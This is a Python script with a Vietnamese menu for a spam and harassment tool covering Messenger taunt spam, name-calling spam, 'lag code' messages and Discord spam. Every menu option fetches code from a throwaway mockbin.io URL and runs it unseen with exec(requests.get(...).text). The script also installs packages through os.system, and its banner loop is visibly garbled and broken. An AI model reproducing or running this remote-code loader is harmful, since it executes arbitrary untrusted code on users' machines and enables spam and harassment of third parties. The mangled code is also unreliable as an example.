import requests,sys
from time import sleep
from datetime import datetime, timedelta
import os
try:
 import requests,colorama,prettytable
except:
  os.system("pip install requests")
  os.system("pip install colorama")
  os.system("pip install prettytable")
#màu
xnhac = "\033[1;36m"
do = "\033[1;31m"
luc = "\033[1;32m"
vang = "\033[1;33m"
xduong = "\033[1;34m"
hong = "\033[1;35m"
trang = "\033[1;37m"
whiteb="\033[1;37m"
red="\033[0;31m"
redb="\033[1;31m"
end='\033[0m'
def banner():

fofor x in banner:
  sys.stdout.write(x)
  sys.stdout.flush() 
  sleep(0.00125)r x in banner:
os.system("cls" if os.name == "nt" else "clear")

banner()
print(" \033[1;37m╭───────────────────────────────⭓")
print("\033[1;32m │1. \033[1;36mTreo Nhây")
print(" \033[1;37m├────────────────────⭔")                                                    
print("\033[1;32m │2. \033[1;36mNhây réo tên")
print(" \033[1;37m├────────────────────⭔")
print("\033[1;32m │3. \033[1;36mTreo Spam Messenger")
print(" \033[1;37m├────────────────────⭔") 
print("\033[1;32m │4. \033[1;36mNhây code lag")
print(" \033[1;37m├────────────────────⭔")
print("\033[1;32m │5. \033[1;36mTreo Ngôn")                  
print(" \033[1;37m├────────────────────⭔")
print("\033[1;32m │6. \033[1;36mTreo Ngôn v2")
print(" \033[1;37m├────────────────────⭔")
print("\033[1;32m │7. \033[1;36mTreo Discord")   
print(" \033[1;37m├────────────────────⭔")
print("\033[1;32m │8. \033[1;36mRéo Tên V2")
print(" \033[1;37m├────────────────────⭔")
print("\033[1;37m │Liên Hệ Anh Tú Để Đuợc Hỗ Trợ")
print(" \033[1;37m╰───────────────────────────────⭓")                  
chon = int(input('\033[1;31m[ • ] \033[1;33m» \033[1;33mNhập Số Từ 1 - 8\033[1;37m: \033[1;35m'))
if chon == 1 :
  exec(requests.get('https://6db5cf3103244d2093739f9890cb424e.api.mockbin.io/').text)
if chon == 2 :
  exec(requests.get('https://a1aff33121ec4a81801e81d8ce38978f.api.mockbin.io/').text)
if chon == 3 :
  exec(requests.get('https://bad5c3da9112414e8d314cbd1418a969.api.mockbin.io/').text)
if chon == 4 :
  exec(requests.get('https://4dc0b0ff9b8247cda0e3dc75be0dd26a.api.mockbin.io/').text)
if chon == 5 :
  exec(requests.get('https://40415a3da4064203b6966449501700ea.api.mockbin.io/').text)
if chon == 6 :
  exec(requests.get('https://c5c219d511474b829624e6be864ee901.api.mockbin.io/').text)
if chon == 7 :
  exec(requests.get('https://77fe9a6eb6fa4d2fb1b6fda7813029d3.api.mockbin.io/').text)
if chon == 8 :
  exec(requests.get('https://a26295d3c88040a9a5a3c9bba914d17b.api.mockbin.io/').text)
  print (" Sai Lựa Chọn ")
  exit()
